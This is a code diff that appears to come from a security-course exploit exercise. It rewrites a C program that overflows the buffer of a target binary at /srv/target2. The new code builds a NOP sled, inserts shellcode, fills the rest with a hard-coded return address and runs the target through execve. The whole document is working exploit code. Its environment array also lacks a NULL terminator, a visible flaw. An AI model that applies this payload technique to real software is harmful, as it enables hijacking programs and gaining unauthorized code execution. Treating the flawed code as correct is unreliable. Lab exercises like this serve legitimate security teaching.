@@ -5,35 +5,44 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target3"
+#define TARGET "/srv/target2"
+#define BUFFER_SIZE 400
+#define SHELLCODE_OFFSET 342
+#define RETURN_ADDRESS 0xffffde18
+
+const int PADDING_LENGTH = 8;
+
+char* create_payload() {
+    char* payload = (char*)malloc(BUFFER_SIZE);
+    memset(payload, 0x90, BUFFER_SIZE);
+
+    memcpy(payload + SHELLCODE_OFFSET, shellcode, strlen(shellcode));
+
+    for (int i = SHELLCODE_OFFSET + strlen(shellcode); i < BUFFER_SIZE; i += 4) {
+        *((uint32_t*)(payload + i)) = RETURN_ADDRESS;
+    }
+
+    return payload;
+}
 
 int main(void) {
-    char *args[] = {
-        TARGET,
-        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
-        NULL
-    };
+    char* args[3];
+    char* env[1];
 
-    static char environment[400] = {0};
-    uint32_t base_address = 0xffffdec0;
+    args[0] = TARGET;
+    args[1] = create_payload();
+    args[2] = NULL;
 
-    // Fill the environment buffer with NOPs
-    memset(environment, 0x90, sizeof(environment) - 1);
+    char padding[PADDING_LENGTH + 1];
+    memset(padding, '0', PADDING_LENGTH);
+    padding[PADDING_LENGTH] = '\0';
 
-    // Adjust return address in the environment
-    *((uint32_t *)(environment)) = base_address + 4;
-    *((uint32_t *)(environment + 4)) = base_address + 8;
+    env[0] = padding;
 
-    // Copy the shellcode to a specific offset within the environment
-    memcpy(environment + 201, shellcode, sizeof(shellcode));
-
-    char *env[] = {environment};
-
-    // Attempt to execute the target binary with the crafted arguments and environment
     execve(TARGET, args, env);
-
-    // If execve fails, print an error message
     fprintf(stderr, "execve failed.\n");
+
+    free(args[1]);
 
     return 0;
 }
